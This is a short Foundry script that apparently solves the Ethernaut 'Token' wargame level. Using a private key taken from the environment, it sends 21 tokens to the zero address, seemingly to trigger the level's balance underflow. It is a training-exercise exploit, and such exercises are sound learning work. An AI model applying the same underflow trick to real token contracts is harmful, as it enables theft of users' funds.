pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/Token/Token.sol";

contract TokenScript is Script {
    function run() public {
        address tokenAddress = vm.envAddress("TOKEN_ADDRESS");
        Token ethernautToken = Token(payable(tokenAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        ethernautToken.transfer(address(0), 21);

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}